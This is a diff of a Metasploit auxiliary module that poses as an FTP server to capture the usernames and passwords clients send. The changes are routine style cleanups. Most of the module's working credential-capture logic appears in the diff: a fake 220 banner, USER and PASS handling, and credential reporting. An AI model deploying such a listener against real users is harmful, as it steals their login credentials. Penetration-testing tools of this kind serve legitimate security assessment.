@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,17 +7,16 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
   def initialize
     super(
-      'Name'        => 'Authentication Capture: FTP',
-      'Description'    => %q{
+      'Name' => 'Authentication Capture: FTP',
+      'Description' => %q(
           This module provides a fake FTP service that
         is designed to capture authentication credentials.
-      },
+      ),
       'Author'      => ['ddz', 'hdm'],
       'License'     => MSF_LICENSE,
       'Actions'     =>
@@ -32,8 +32,9 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 21 ])
-      ], self.class)
+        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 21 ])
+      ], self.class
+    )
   end
 
   def setup
@@ -43,11 +44,11 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
-    exploit()
+    exploit
   end
 
   def on_client_connect(c)
-    @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
+    @state[c] = { name: "#{c.peerhost}:#{c.peerport}", ip: c.peerhost, port: c.peerport, user: nil, pass: nil }
     c.put "220 FTP Server Ready\r\n"
   end
 
@@ -79,22 +80,22 @@ class MetasploitModule < Msf::Auxiliary
 
   def on_client_data(c)
     data = c.get_once
-    return if not data
-    cmd,arg = data.strip.split(/\s+/, 2)
+    return unless data
+    cmd, arg = data.strip.split(/\s+/, 2)
     arg ||= ""
 
-    if(cmd.upcase == "USER")
+    if cmd.casecmp("USER").zero?
       @state[c][:user] = arg
       c.put "331 User name okay, need password...\r\n"
       return
     end
 
-    if(cmd.upcase == "QUIT")
+    if cmd.casecmp("QUIT").zero?
       c.put "221 Logout\r\n"
       return
     end
 
-    if(cmd.upcase == "PASS")
+    if cmd.casecmp("PASS").zero?
       @state[c][:pass] = arg
 
       report_cred(
@@ -111,13 +112,10 @@ class MetasploitModule < Msf::Auxiliary
 
     @state[c][:pass] = data.strip
     c.put "500 Error\r\n"
-    return
-
+    nil
   end
 
   def on_client_close(c)
     @state.delete(c)
   end
-
-
 end
